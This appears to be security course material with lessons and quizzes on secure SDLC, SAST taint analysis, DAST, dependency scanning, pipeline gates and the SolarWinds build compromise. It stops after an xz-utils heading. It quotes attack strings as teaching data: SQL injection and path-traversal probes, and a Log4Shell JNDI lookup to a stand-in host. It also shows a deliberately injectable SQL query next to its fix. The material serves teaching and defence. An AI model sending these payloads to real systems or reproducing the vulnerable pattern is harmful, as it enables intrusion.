subject: security
title: Security Engineering in Practice
summary: How security is done day to day: building it into the SDLC, defending the software supply chain, managing secrets, and detecting and responding to incidents, taught through SolarWinds, xz-utils and Log4Shell.

lessons.title: Security throughout development
lessons.summary: Match security activities to each stage of development and distinguish application requirements from process maturity.
lessons.body:
Many vulnerabilities arise from ordinary bugs (a string glued into a SQL query, a missing permission check, a debug endpoint left on) that nobody looked for at the right moment. The **secure software development life cycle (secure SDLC)** is the idea that security is a property of *how you build software*, not a test you run the week before launch.

Consider an illustrative late-review process: developers build for six months, a security team pen-tests for two weeks, finds forty issues, and the release slips or ships anyway. The secure SDLC spreads that work across every phase, using automation and human review, aiming to reduce the cost and exposure of late discovery.


## Why "shift left"

**Shifting left** means moving security checks earlier in the timeline, towards the developer's keyboard. The reasons are practical:

- **Context.** A developer fixing a SAST finding on their own pull request remembers the code. Six months later, someone else has to rediscover it.
- **Blast radius.** A flaw in a design document costs an edit. The same flaw shipped to 10,000 customers costs a patch, a disclosure and perhaps a breach.
- **Feedback loops.** Developers learn from fast feedback. Timely actionable feedback can be easier to apply than a delayed report; either format can still teach.

> [!analogy] Real-world analogy: inspecting a house while it is built
> A building inspector who checks the foundations and wiring while they are still exposed can ask for a quick fix. An inspector who first visits the finished house must open walls to see the same things.
>
> **How it maps:** The open foundations are a design document or a pull request; the finished house is released software. Checking early (threat modelling, code review, SAST on each change) finds a flaw while its context is visible and changing it touches little else.
>
> **Where it stops:** A house is inspected once and then stands still. Software keeps changing and new attacks keep appearing, so early checks complement, rather than replace, testing of the running system and monitoring in production.

> [!note] About the "100× cheaper" statistic
> You will often see a claim that a bug costs 100 times more to fix in production than in design, attributed to IBM. The original source is hard to trace and the exact multiplier is not well supported. Earlier discovery can avoid downstream rework, but actual cost depends on the defect and project. No universal multiplier is asserted here.

## The phases and their security activities

| Phase | Security activity |
|---|---|
| Requirements | Security requirements, abuse cases |
| Design | Threat modelling, design review |
| Build | Secure coding, review, SAST, SCA |
| Test | DAST, fuzzing, pen testing |
| Release | Signing, SBOM, config review |
| Operate | Monitoring, patching, incident response |

A few of these deserve a word:

- **Abuse cases** are user stories written from the attacker's side: "As an attacker, I want to reset another user's password by guessing the token." They turn vague worries into testable requirements.
- **Threat modelling** (STRIDE, attack trees; see the fundamentals module) happens at design time, when changing direction is cheap.
- **Security requirements** can be taken from a checklist such as the **OWASP Application Security Verification Standard (ASVS)**, which lists concrete, testable controls at three levels of rigour (version 5.0, checked November 2026). Level 1 is the starting baseline; higher levels add depth for riskier applications.

You do not have to invent the process. **Microsoft's Security Development Lifecycle** (made mandatory internally in 2004, after Bill Gates's 2002 "Trustworthy Computing" memo) is one prominent large-scale example; no claim of historical priority is made here. The **NIST Secure Software Development Framework** (SP 800-218, version 1.1 from 2022; a version 1.2 draft appeared in December 2025) recommends practices in four groups: prepare the organisation, protect the software, produce well-secured software and respond to vulnerabilities. **OWASP SAMM** provides an explicit maturity model for assessing how well an organisation performs such practices.

The distinction matters in practice. ASVS asks "does *this application* meet these controls?"; SAMM asks "how mature is *the way we build* applications?". A team can pass an ASVS review of one app while its organisation has no repeatable threat-modelling or incident-handling practice.

## Key takeaways
- Place security work throughout requirements, design, implementation, testing, release and operation.
- Earlier discovery preserves context and can avoid rework, without a universal cost multiplier.
- ASVS describes application controls; SAMM describes the maturity of organisational practices.

## Further reading
- [NIST Secure Software Development Framework](https://csrc.nist.gov/pubs/sp/800/218/final)
- [OWASP SAMM model](https://owaspsamm.org/model/)
- [OWASP ASVS](https://owasp.org/www-project-application-security-verification-standard/)
- [Microsoft SDL history](https://download.microsoft.com/download/c/e/f/cefb7bf3-de0c-4dcb-995a-c1c69659bf49/sdlprogressreport.pdf)

questions.prompt: A two-week pre-release pen test finds that users of a new invoicing feature can view other customers' invoices. Fixing it means reworking the access model in three services, and the release slips. Which change for the next feature best applies **shifting left**?

options.text: Book a longer pen test just before each release so more issues are found
options.explanation: This keeps the work on the right of the timeline. A longer late test may find more, but every finding still arrives when changing the design is most disruptive.

options.text: Move all security review to a central team that signs off each release
options.explanation: Concentrating review in a late central gate is closer to the opposite of shifting left, which pushes security activities towards design and development.

options.text: Threat-model the design and write abuse cases such as "view another customer's invoice" before coding, then check them in review and tests
options.explanation: Correct. Shifting left moves security work earlier: an authorisation flaw found in the design or a pull request is fixed while the context is fresh and before other services depend on it. The pre-release test still has value as a later check.

options.text: Ship on time and schedule access-control fixes for a later sprint
options.explanation: Deferral moves work later and leaves the exposure live in the meantime; it does not move any security activity earlier.

questions.workedExample:
1. Ask where the flaw was introduced: in the design of the access model, before any code was written.
2. Ask where it was found: in a pen test just before release, after three services had been built around that design.
3. Shifting left means adding a security activity at the point of introduction, here design-time threat modelling and an attacker-side abuse case, plus checks on each pull request.
4. Keep the later pen test and monitoring: earlier checks complement them. How much rework this saves depends on the defect and project; no fixed cost multiplier is implied.

link.title: NIST SP 800-218: Secure Software Development Framework

questions.prompt: An engineering director wants to know whether the organisation's secure-development practices are improving year on year, across 30 teams, against a recognised framework. What fits best?

options.text: Count the number of SAST findings each year; fewer means better
options.explanation: Raw finding counts are easily gamed (disable rules, scan less code) and say nothing about design review, incident response or training.

options.text: Run an annual external pen test and compare the number of high-severity findings
options.explanation: A pen test samples one application at one point in time. It measures outcomes for that target, not the maturity of practices across 30 teams.

options.text: Assess each team against a maturity model such as OWASP SAMM (or map practices to NIST SSDF) and track the scores over time
options.explanation: Correct. SAMM defines practices across governance, design, implementation, verification and operations, each with maturity levels, so you can measure where teams are and set targets.

options.text: Adopt OWASP ASVS Level 3 for every application
options.explanation: ASVS is a list of verification requirements for an *application*, not a model for measuring the maturity of an organisation's *process*. Level 3 everywhere would also be excessive for most apps.

questions.workedExample:
1. The question is about *process maturity across an organisation*, not the security of one app.
2. SAMM is built for this: business functions (governance, design, implementation, verification, operations), each split into practices with maturity levels 1 to 3.
3. Teams self-assess or are assessed; the scores give a baseline and a roadmap.
4. NIST SSDF lists practices you can map against, useful for US government suppliers.
5. ASVS answers 'is this application verified to level N?', which is complementary but different.

lessons.title: Static analysis and SQL data flow
lessons.summary: Trace untrusted values into SQL text and see why parameter binding changes the risk.
lessons.body:
A static scanner examines code without executing it. For an injection finding, the important question is which argument contains untrusted data: SQL grammar and bound parameter values have different roles. This unit follows the same input through unsafe string construction and a parameterised query.

## SAST: reading the code

**Static application security testing (SAST)** analyses source code (or bytecode) without running it. Tools include Semgrep, CodeQL, SonarQube and, for Python, Bandit.

The simplest SAST tools match patterns: "flag any call to `eval`". Better tools do **taint analysis**. They track data from **taint sources** (things an attacker controls) to **taint sinks** (dangerous operations), and raise an alert if tainted data reaches a sink without passing through a **sanitising function** (one that makes data safe for that sink, such as escaping or validation).

```
 source        propagation       sink
 request.args -> name -> q -> execute()
                    ^
           no sanitiser on path
               => ALERT
```

> [!analogy] Real-world analogy: a dye test in the plumbing
> A plumber tracing a leak pours coloured dye into one inlet and watches which taps turn colour, and whether the water passed through a filter on the way.
>
> **How it maps:** The inlet is a taint source such as `request.args`, the dye is the taint label, the pipes are assignments and string formatting, and the tap is the sink argument such as the SQL text given to `execute`. A filter on the route is a sanitiser that suits that sink.
>
> **Where it stops:** Real dye flows wherever water goes. A static analyser only follows the pipes its model knows about, so data passing through queues, reflection or other services can vanish from view (a missed flow), and a route it cannot rule out may be flagged although no attacker data really reaches it.

Here is vulnerable code that a suitably configured taint rule can flag:

```python
from flask import request
import sqlite3

def search():
    # Input is attacker-controlled data.
    name = request.args.get("name")
    db = sqlite3.connect("shop.db")
    # Input becomes SQL grammar here.
    q = ("SELECT * FROM items "
         f"WHERE name = '{name}'")
    return db.execute(q).fetchall()
```

The fix is a parameterised query, which keeps the data separate from the SQL grammar entirely:

```python
    # Keep input separate from SQL grammar.
    q = "SELECT * FROM items WHERE name = ?"
    return db.execute(q, (name,)).fetchall()
```

Bandit's B608 documentation illustrates a finding in this form; exact output and confidence depend on code shape and tool version:

```
>> Issue: [B608:hardcoded_sql_expressions]
   Possible SQL injection vector through
   string-based query construction.
   Severity: Medium   Confidence: Low
```

Note the "Confidence: Low". Bandit only sees that a string containing SQL keywords was built by formatting; it does not know whether `name` came from a user. A taint-tracking tool such as CodeQL, or a Semgrep taint rule, can be more precise:

```
rules:
  - id: flask-sqli
    languages: [python]
    severity: ERROR
    message: SQL built from request data
    mode: taint
    pattern-sources:
      - pattern: flask.request.$X
    pattern-sinks:
      - patterns:
          - pattern: $DB.execute($Q, ...)
          - focus-metavariable: $Q
```

This local teaching rule focuses the sink on the *query* argument, so bound data in a separate parameter argument is not expected to create this SQL-text finding. Its positive and negative examples must be checked with the installed Semgrep version; a passing fixture does not establish complete coverage of Flask input or every SQL API.

### Strengths and limits of SAST

- **Runs early and fast**, on every pull request, before anything is deployed.
- **Identifies code locations**, helping developers investigate findings; modelled paths and reported locations still need review.
- **Covers code paths tests never reach**, by reasoning about paths without executing them, but practical analyses approximate behavior and may miss paths or flows.
- **False positives.** It cannot always tell whether a value is really attacker-controlled or already validated. Noisy tools get ignored.
- **False negatives.** It struggles with things that are not visible in code: misconfigured servers, logic flaws ("a user can approve their own expense claim"), or data flowing through reflection, queues and other services.

## Key takeaways
- A taint model tracks sources, propagation, sinks and context-specific sanitisers.
- Parameter binding keeps input separate from the SQL grammar.
- Static findings depend on the rule and program model; both false positives and missed flows remain possible.

## Further reading
- [Semgrep taint analysis](https://semgrep.dev/docs/writing-rules/data-flow/taint-mode/overview)
- [Bandit B608 SQL construction](https://bandit.readthedocs.io/en/latest/plugins/b608_hardcoded_sql_expressions.html)
- [Python SQLite parameter binding](https://docs.python.org/3/library/sqlite3.html)

questions.prompt: A SAST tool reports a possible SQL injection. In taint-analysis terms, what has it found?

options.text: A SQL query that is slow because it lacks an index
options.explanation: Performance is not what taint analysis tracks. It models the flow of untrusted data, not query plans.

options.text: Data from an attacker-controlled source reaching a dangerous sink without passing through a sanitiser
options.explanation: Correct for the configured taint model. It tracks attacker-controlled sources and whether their data reaches the dangerous sink argument without suitable sink-specific handling. Parameter binding keeps values separate from SQL text; it is not a general-purpose sanitising function.

options.text: A request at runtime that returned a database error
options.explanation: Observing a runtime error is what DAST does. SAST never runs the program; it reasons about the code.

options.text: A dependency with a published CVE
options.explanation: Matching dependencies against vulnerability databases is software composition analysis (SCA), not taint analysis of your own code.

questions.workedExample:
1. A taint engine labels values from **taint sources** as tainted, e.g. `request.args.get('name')`.
2. It propagates the label through assignments, string formatting and function calls.
3. If a tainted value reaches a **sink**, such as the SQL string passed to `execute`, it raises an alert.
4. A modelled, sink-appropriate **sanitising function** may remove the label, and parameterised queries avoid putting input into the SQL-text sink because the data travels separately from the SQL text.

questions.prompt:
Which line, if any, should a well-written taint rule flag?

```python
# Both calls use a local test database.
name = request.args.get("n")
q1 = f"SELECT * FROM t WHERE n='{name}'"
q2 = "SELECT * FROM t WHERE n=?"
# A: input became part of SQL grammar.
db.execute(q1)        # line A
# B: bind input as data, not SQL text.
db.execute(q2, (name,))  # line B
```

options.text: Line A only
options.explanation: Correct. In line A the tainted `name` is formatted into the SQL text, which reaches the query sink. In line B the SQL text is a constant and `name` travels as a bound parameter, which the driver never parses as SQL.

options.text: Line B only
options.explanation: Line B is the safe, parameterised form. Flagging it would be a false positive; that is why the lesson's rule uses `focus-metavariable` on the query argument only.

options.text: Both lines, because `name` is tainted in both
options.explanation: Taint reaching a call is not enough; it must reach the *sink argument*. In line B it reaches a parameter slot, which is not a sink.

options.text: Neither, because `request.args.get` returns a string, not SQL
options.explanation: Every injection payload is 'just a string'. The danger is a string concatenated into code that is then parsed, which is exactly line A.

questions.workedExample:
1. Source: `request.args.get("n")`, so `name` is tainted.
2. `q1` is built from `name` by an f-string: taint propagates, `q1` is tainted.
3. `q2` is a literal: untainted.
4. Sink: the first argument of `execute`.
   - Line A: sink receives tainted `q1`. Flag.
   - Line B: sink receives untainted `q2`; `name` is in the parameter tuple. No flag.
5. A rule matching the whole call (any argument) would wrongly flag B, which is how noisy tools lose developers' trust.

lessons.title: Runtime testing, dependencies and fuzzing
lessons.summary: Choose complementary tests for running configuration, vulnerable libraries and unusual parser inputs.
lessons.body:
A single scanner cannot establish that an application is secure. Static analysis from the previous unit sees selected code patterns; a running deployment, third-party components and a parser fed unusual inputs provide different evidence. Match the technique to the failure you need to find.

## DAST: attacking the running app

**Dynamic application security testing (DAST)** treats the application as a black box. It crawls a running instance, then sends malicious inputs (`' OR 1=1--`, `<script>`, `../../etc/passwd`) and inspects the responses. OWASP ZAP and Burp Suite are the best-known tools.

DAST can observe runtime manifestations of problems such as:

- Missing security headers (`Content-Security-Policy`, `Strict-Transport-Security`).
- Cookies without `Secure` or `HttpOnly`.
- Verbose error pages that leak stack traces.
- Injection flaws that are actually exploitable, end to end.

Its limits mirror SAST's. It needs a deployed environment, so it runs later. It only tests what it can reach, so pages behind logins, multi-step forms or single-page-app routing are often missed unless you configure authentication and seed URLs. And when it finds a bug, it usually reports the request/endpoint rather than a reliable source-code location, unless integrated instrumentation provides one.

## SCA, IAST and fuzzing

Three more techniques complete the picture.

- **Software composition analysis (SCA)** checks your *dependencies* against databases of known vulnerabilities. Tools include Dependabot, `pip-audit`, Snyk and OWASP Dependency-Check. The supply-chain units cover dependency inventory and selection in depth.
- **Interactive testing (IAST)** instruments the running app, so when DAST or a functional test sends a payload, an agent inside the process sees exactly which line it reached. It can connect exercised requests to internal code locations, subject to instrumentation, supported runtimes and test coverage.
- **Fuzzing** throws huge numbers of random or mutated inputs at a parser and watches for crashes. Coverage-guided fuzzing with suitable memory-error detectors is particularly useful for finding memory-safety bugs. **Heartbleed** (2014, OpenSSL) was found independently by a Google engineer reviewing code and by the security firm Codenomicon using its own fuzz-testing tools. Google's **OSS-Fuzz** has since found thousands of vulnerabilities in open-source projects.

| Technique | Needs | Best at |
|---|---|---|
| SAST | Source | Injection, unsafe APIs |
| DAST | Running app | Config, headers, real exploits |
| SCA | Dependency list | Known CVEs in libraries |
| Fuzzing | Harness | Parser and memory bugs |

> [!example] Log4Shell and the limits of SAST
> In December 2021, Log4Shell (CVE-2021-44228) could enable remote code execution in affected Log4j Core configurations when attacker-controlled input such as `${jndi:ldap://evil.example/a}` reached a vulnerable lookup path. A scan limited to application code and lacking relevant dependency/flow models might miss the problem: calling `log.info(userAgent)` is normal. The flaw lived in the Log4j library, in JNDI lookup support added in July 2013 (Apache issue LOG4J2-313). Teams with an accurate dependency inventory could identify candidate exposure more directly than those reconstructing one during the incident. Comparative hour/week claims about how quickly teams responded are omitted because this review did not obtain supporting incident data.

## Key takeaways
- DAST sees responses from a running target, subject to authentication and crawl coverage.
- SCA locates known dependency advisories; IAST adds runtime instrumentation.
- Coverage-guided fuzzing exercises unusual inputs and is useful with memory-error detectors.
- Normal application logging calls can reach a vulnerable dependency such as historical Log4j Core.

## Further reading
- [ZAP scanner documentation](https://www.zaproxy.org/docs/desktop/start/features/)
- [OSS-Fuzz](https://google.github.io/oss-fuzz/)
- [Apache Log4j advisories](https://logging.apache.org/log4j/2.x/security.html)
- [Heartbleed discovery](https://heartbleed.com/)
- [Apache JNDI feature issue, July 2013](https://issues.apache.org/jira/browse/LOG4J2-313)

questions.prompt: Which problem is DAST much better placed to find than SAST?

options.text: A call to `pickle.loads` on a request body
options.explanation: This is visible directly in the source, which is exactly what SAST (e.g. Bandit's B301 check) is good at.

options.text: A hard-coded password in a Python module
options.explanation: A literal password string sits in the code, so static analysis or a secret scanner finds it without running anything.

options.text: The production web server returning responses without a `Strict-Transport-Security` header
options.explanation: Correct. Headers are often set by a reverse proxy, load balancer or framework config, not visible in the application code. DAST sees the real HTTP response.

options.text: A function that uses `eval` on a configuration value
options.explanation: `eval` calls are a classic target for SAST pattern rules. No running app is needed.

questions.workedExample:
1. Ask: is the evidence in the source code, or only in the running system?
2. `pickle.loads`, `eval` and password literals are all in the code: SAST territory.
3. Response headers may come from nginx, a CDN or framework defaults. Reading `app.py` will not tell you what the browser receives.
4. DAST makes real requests and inspects real responses, so it sees the missing HSTS header.

questions.prompt: Which of these are genuine limitations of standalone black-box **DAST**, without runtime source instrumentation? Select all that apply.

options.text: It needs a running, deployed instance of the application
options.explanation: Correct. DAST sends real requests, so it runs later in the CI/CD pipeline (staging or a test environment) than SAST.

options.text: It may miss pages behind login or deep in single-page-app routing unless configured with credentials and seed URLs
options.explanation: Correct. A crawler only tests what it can reach. Authenticated scanning and API definitions (e.g. OpenAPI) are needed for good coverage.

options.text: When it finds a flaw it reports the URL and payload, not the line of code responsible
options.explanation: Correct. DAST is black-box, so mapping a finding back to code is left to the developer (IAST closes this gap).

options.text: It cannot find vulnerabilities that are actually exploitable end to end
options.explanation: Incorrect. That is DAST's strength: if the injected payload produces evidence in the response, the flaw is demonstrably reachable.

options.text: It can only analyse compiled languages
options.explanation: Incorrect. DAST does not look at code at all, so the implementation language is irrelevant.

questions.workedExample:
1. DAST is black-box testing of a running app over HTTP.
2. Consequences of 'running': needs an environment, so it runs later. (A true.)
3. Consequences of 'black-box crawling': coverage depends on what it can reach. (B true.)
4. Consequences of 'no code access': findings are URLs, not lines. (C true.)
5. Its realism is a strength, not a weakness, so D is false; and it is language-agnostic, so E is false.

questions.prompt: In December 2021 a team ran their usual SAST scan over their Java service to check for Log4Shell. It reported nothing. Why was this result misleading?

options.text: SAST tools cannot analyse Java
options.explanation: Many SAST tools (CodeQL, Semgrep, SpotBugs, SonarQube) analyse Java well. The language was not the problem.

options.text: A scan limited to application code can miss vulnerabilities inside dependencies; inventory and dependency analysis are needed alongside relevant code analysis
options.explanation: Correct. Calling `log.info(userAgent)` is perfectly normal application code. The dangerous JNDI lookup happened inside Log4j, so you needed to know which services contained a vulnerable Log4j version, including as a transitive dependency.

options.text: Log4Shell only affected services that called `eval`
options.explanation: Log4Shell did not depend on eval. In affected lookup paths and runtime configurations, logged attacker-controlled text could trigger a remote lookup.

options.text: SAST only detects vulnerabilities that have already been exploited
options.explanation: SAST reasons about code before deployment and knows nothing about exploitation history.

questions.workedExample: CVE-2021-44228 affected vulnerable Log4j Core releases and lookup behavior, not every Java server or every Log4j component. Normal logging calls may feed attacker-controlled data into that dependency. An application-only scan with no relevant models may miss it; dependency inventory/SCA helps locate candidate exposure, while reachability, configuration and runtime analysis refine impact.

questions.prompt: A file-format parser written in C keeps receiving crash reports from users with odd input files. Which technique is most likely to find the remaining bugs of this kind efficiently?

options.text: DAST against the company website
options.explanation: The parser is a library, not a web endpoint; a web scanner would never exercise it with millions of malformed files.

options.text: Software composition analysis
options.explanation: SCA finds *known* CVEs in third-party packages. These are unknown bugs in the team's own parser.

options.text: Coverage-guided fuzzing of the parser, ideally with sanitisers such as AddressSanitizer
options.explanation: Correct. A fuzzer mutates inputs millions of times, keeps those that reach new code, and detects crashes and memory errors. This is how OSS-Fuzz finds bugs in parsers continuously.

options.text: A threat-modelling workshop
options.explanation: Threat modelling identifies risks in a design. It will not pinpoint which byte sequence overflows a buffer.

questions.workedExample:
1. Symptom: crashes on unusual inputs in C code. That smells of memory-safety bugs (out-of-bounds reads, use-after-free).
2. Need: generate vast numbers of unusual inputs and detect subtle memory errors, not just crashes.
3. A coverage-guided fuzzer (libFuzzer, AFL++) does exactly that; AddressSanitizer turns silent corruption into a reported crash.
4. Heartbleed, an out-of-bounds read in OpenSSL, is the classic example of this class of bug being found by testing tools.

lessons.title: Security checks developers can use
lessons.summary: Build actionable pipeline gates while retaining human review for business rules and design.
lessons.body:
Security checks help when someone can act on their results. This unit combines static, dynamic, dependency and secret checks into a practical pipeline, then considers how to handle an existing backlog and business rules that generic tools do not know.

## Putting it in a pipeline

```
 commit ──> pre-commit: secret scan
   │
 pull req ─> SAST + SCA (risk-based gates)
   │         + human code review
 merge ──> build, sign, SBOM
   │
 staging ─> DAST baseline scan
   │
 release ─> monitor, patch, respond
```

Some practical rules:

1. **Use risk-based build gates.** Baseline and triage existing findings, gate actionable new issues, and escalate severe existing vulnerabilities rather than exempting them merely because they are old. A gate that fails on 3,000 legacy warnings gets switched off.
2. **Tune rules.** Disable checks that never find anything real in your codebase; add custom rules for your own dangerous patterns.
3. **Put results where developers work**: as PR comments rather than in a separate dashboard nobody opens.
4. **Use security champions**: one developer per team with extra training, who triages findings and is the first point of contact. This spreads trained first-line support across teams; it does not eliminate specialist review or guarantee a particular improvement.
5. **Keep humans in the loop.** Code review and threat modelling find logic and design flaws that generic scanners may miss without the relevant security requirements and models.

## Common pitfalls

- **Tools as a checkbox.** Running a scanner for compliance and never reading the output adds cost and no security.
- **Treating "no findings" as "secure".** Each tool has blind spots; absence of evidence is not evidence of absence.
- **Security as gatekeeper.** If the security team is a bottleneck that says "no", teams route around it. Paved roads (secure defaults, approved libraries, templates) reduce avoidable friction and can complement risk-based gates.
- **Skipping design.** A generic scanner may miss a non-expiring password-reset token; custom rules, framework checks and targeted dynamic tests can detect some such flaws.

## Key takeaways
- Baseline and triage an existing backlog while escalating severe existing issues.
- Gate actionable new findings, tune rules and put results where developers work.
- Human review identifies business requirements that can become custom checks and targeted tests.
- Choose initial automation to match the stated risks rather than treating package counts as a risk measurement.

## Further reading
- [NIST SSDF](https://csrc.nist.gov/pubs/sp/800/218/final)
- [OWASP Security Champions Guide](https://owasp.org/www-project-security-champions-guide/)
- [Semgrep documentation](https://semgrep.dev/docs/)

questions.prompt: You introduce a SAST gate on a 10-year-old codebase. The first scan produces 3,200 findings and the gate fails every build. Developers ask for it to be disabled. What is the best course of action?

options.text: Keep the gate failing until all 3,200 findings are fixed
options.explanation: A huge untriaged backlog can make a gate impractical, but an urgent existing vulnerability may still justify stopping release. Triage risk before deciding.

options.text: Turn the tool into an advisory report that nobody is required to read
options.explanation: This removes friction and also removes the value; new vulnerabilities would merge unchecked.

options.text: Record the existing findings as a baseline, fail only on new high-confidence findings, and burn the backlog down separately
options.explanation: A useful default is to baseline and triage the backlog while gating actionable new issues. Severe existing findings still require prompt escalation; no assumption that most findings are false positives is justified here.

options.text: Replace SAST with an annual pen test, which has fewer false positives
options.explanation: A pen test is useful but is late, periodic and covers a fraction of the code. It cannot replace feedback on every pull request.

questions.workedExample:
1. Goal: stop new vulnerabilities and reduce old ones, without the tool being switched off.
2. A baseline snapshot marks the 3,200 existing findings as known.
3. The gate now fails only when a PR introduces a *new* high-confidence finding, so actionable changes are distinguishable. Frequency depends on the codebase; severe existing findings still need prompt escalation.
4. The backlog is triaged separately: suppress false positives, fix the real high-severity issues first.
5. Most tools (Semgrep, CodeQL, SonarQube) support baselines or 'new code' modes for exactly this reason.

questions.prompt: Which of these flaws would **neither** SAST nor DAST typically detect without human help? Select all that apply.

options.text: A user can approve their own expense claim because the approval endpoint checks the role but not that approver differs from submitter
options.explanation: Correct for a generic scan without the business rule. A custom rule, test or policy-aware analysis could detect missing self-approval checks.

options.text: A password-reset token that never expires
options.explanation: Correct as a likely generic-tool blind spot, not an impossibility: framework-specific checks, custom static rules or expiry-focused dynamic tests can detect some cases.

options.text: A reflected XSS where a query parameter is echoed unescaped into HTML
options.explanation: Incorrect. This is a staple of both: SAST traces the parameter to the template sink, and DAST injects a marker and sees it reflected unescaped.

options.text: A session cookie set without the `HttpOnly` flag
options.explanation: Incorrect. DAST checks cookie flags in every response it sees, and SAST can often flag the cookie-setting call.

questions.workedExample: Generic scanners encode selected insecurity patterns and may lack an application's business rules or token-lifecycle model. Human review should identify those requirements and turn them into tests or custom rules where possible. XSS and cookie flags are common checks, but detection is still dependent on coverage and configuration.

questions.prompt: A Python web team with 140 dependencies wants a low-setup-cost starting point for automated security checks, prioritising known dependency vulnerabilities and accidental secret commits. Which option best matches that stated aim?

options.text: A full authenticated DAST scan of every page on each commit
options.explanation: Valuable, but expensive to configure (auth, test data, a stable environment) and slow. A baseline DAST scan is a good later step.

options.text: SCA (e.g. `pip-audit` or Dependabot) plus secret scanning on every PR
options.explanation: Correct for the stated priorities: dependency and secret scanners directly address them. Findings still need triage and remediation; package count alone does not prove the dominant attack path or quantify risk reduction.

options.text: A coverage-guided fuzzing campaign
options.explanation: Fuzzing shines on parsers and memory-unsafe code. A Python web app with little parsing code would get comparatively little from it.

options.text: A custom CodeQL rule pack written from scratch for the codebase
options.explanation: Custom rules can be powerful but need expertise. The stated initial priorities are dependency advisories and secret commits; the question gives no evidence that those risks dominate every other risk.

questions.workedExample: Choose tools that match the stated goals: SCA identifies known dependency advisories and secret scanning looks for exposed credentials. Setup and triage effort vary with the project; a 140-package count is insufficient to prove this is universally the best risk/effort investment. Threat modelling can guide subsequent SAST, DAST and targeted fuzzing.

lessons.title: Supply chains and the SolarWinds build
lessons.summary: See how a clean repository can produce a signed malicious build.
lessons.body:
Applications can include many transitive dependencies beyond the ones developers select directly; actual counts vary by project. Add the compiler, the CI system, the base container image and the build scripts, and the code you wrote is a small island in a sea of code you trust without reading.

**Supply-chain attacks** target that sea. Instead of breaking into one hardened company, the attacker compromises something many companies consume, and lets the victims install the payload themselves. The attacker gets reach, and the payload arrives signed, trusted and through the front door.


## Where the chain can break

```
 source ─> build ─> package ─> consumer
   │         │         │          │
 rogue    tampered  hijacked  typosquat,
 commit   builder   registry  confusion,
                    account   vulnerable
                              dependency
```

Each arrow is a trust relationship. Three real incidents show three different links failing.

## SolarWinds: the build system (2020)

SolarWinds Orion is network-monitoring software used by thousands of large organisations, including US government departments. Attackers, later attributed by the US and UK governments to Russia's foreign intelligence service (SVR), got into SolarWinds' build environment.

They did not commit malicious code to the repository, where developers might notice it. Instead they planted a tool that CrowdStrike later named **SUNSPOT** on the build server. It watched for the `MsBuild.exe` build-engine process building Orion, swapped one source file (`InventoryManager.cs`) for a backdoored version for the duration of the build, then put the original back.

The result, **SUNBURST**, was compiled into a legitimate DLL, **signed with SolarWinds' own code-signing certificate**, and shipped in Orion updates from around March to June 2020. SolarWinds initially estimated fewer than 18,000 customers might have installed affected versions. The backdoor waited roughly two weeks before calling home, and the attackers then picked a much smaller set of high-value targets for follow-on intrusion.

> [!analogy] Real-world analogy: a swapped ingredient on the factory line
> A food factory's recipe is checked and approved. On the production line, a saboteur swaps one ingredient during each batch and puts the original back afterwards. Every packet still leaves with the factory's genuine quality seal.
>
> **How it maps:** The approved recipe is the clean source in git. The production line is SolarWinds' build server, the swapped ingredient is SUNSPOT replacing `InventoryManager.cs` during compilation, and the quality seal is the code-signing signature applied after the build.
>
> **Where it stops:** Inspectors could test a food sample for the wrong ingredient. Compiled software carries no simple chemical trace of its source, so detecting this means protecting and checking the build itself, for example with isolated builders, provenance and independent rebuilds.

Lessons:

- **Code signing binds content to a signing key; it does not prove the actual builder or that the content is safe.** The signature was genuine.
- **Source review is not enough.** The source in git was clean; the build was not.
- The build system is production infrastructure and needs production-grade security.

## Key takeaways
- Source, builder, registry and consumer are separate trust boundaries.
- SUNSPOT changed source during the Orion build; SUNBURST arrived in signed updates.
- A valid signature binds content to a key and does not establish that the build or software is safe.

## Further reading
- [CrowdStrike SUNSPOT analysis](https://www.crowdstrike.com/blog/sunspot-malware-technical-analysis/)
- [Mandiant SUNBURST analysis](https://cloud.google.com/blog/topics/threat-intelligence/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor)
- [UK attribution of SolarWinds compromise](https://www.gov.uk/government/news/russia-uk-exposes-russian-involvement-in-solarwinds-cyber-compromise)

questions.prompt: Why are supply-chain attacks so attractive to attackers compared with attacking each target directly?

options.text: They only work against open-source software, which has no security team
options.explanation: SolarWinds Orion was proprietary commercial software. Supply-chain attacks hit any shared component, open or closed.

options.text: One compromise of a widely used component delivers the payload to many victims, who install it themselves through a trusted channel
options.explanation: Correct. The attacker can reach many consumers through their normal update path, often with a valid signature. SolarWinds initially estimated fewer than 18,000 customers might have installed affected versions; that was not a count of confirmed follow-on intrusions.

options.text: They are legal because the victim chose to install the software
options.explanation: Installing a trojanised update is not consent to being hacked. These are serious crimes, and SolarWinds was attributed to a state intelligence service.

options.text: They never require any technical skill
options.explanation: Some (typosquatting) are cheap, but SolarWinds and xz-utils were highly sophisticated, multi-year operations.

questions.workedExample:
1. A direct attack must beat each target's own defences: firewalls, EDR, staff training.
2. A supply-chain attack beats one supplier's defences once.
3. Victims then fetch the payload themselves via a channel they trust (updates, package installs), often with a valid signature.
4. So the cost per victim falls dramatically and detection is harder: the software looks exactly like a normal update.

questions.prompt: In the SolarWinds attack, the trojanised Orion DLL carried a valid SolarWinds code-signing signature. What does this teach about code signing?

options.text: Signatures bind artifact bytes to a signing key; they do not independently prove safe content or the actual build process
options.explanation: Correct. SUNSPOT injected the backdoor during SolarWinds' own build, so SolarWinds' own build pipeline signed it. The signature was genuine; the content was not what SolarWinds intended.

options.text: SolarWinds' signing key must have been stolen and used by the attackers on their own machines
options.explanation: There was no need: the attackers modified the build *inside* SolarWinds' environment, so the normal signing step signed the backdoored output.

options.text: Code signing is useless and should be abandoned
options.explanation: Signing still stops many attacks (tampering in transit, fake download mirrors). It just cannot protect against compromise before the signing step.

options.text: The attackers broke the signature algorithm
options.explanation: No cryptography was broken. The signature was computed legitimately over malicious content.

questions.workedExample:
1. The pipeline was: source (clean) -> build (SUNSPOT swaps `InventoryManager.cs`) -> compile -> **sign** -> ship.
2. Signing happened after the injection, so it faithfully vouched for the backdoored DLL.
3. A signature answers: 'did this come from the holder of key K, unmodified since signing?' It does not answer: 'is this what the developers meant to ship?'
4. Defences must therefore cover the build itself: isolated, ephemeral builders and provenance (SLSA Build L3).

lessons.title: xz-utils and release-only changes
lessons.summary: Distinguish trusted source review from checking what a release archive actually builds.
lessons.body:
A release archive can contain files absent from the corresponding repository snapshot. The 2024 xz-utils backdoor shows how maintainer trust, build-time conditions and binary test fixtures can combine. The historical conditions below describe affected releases, not every Linux system or SSH server.

## xz-utils: the maintainer (2024)

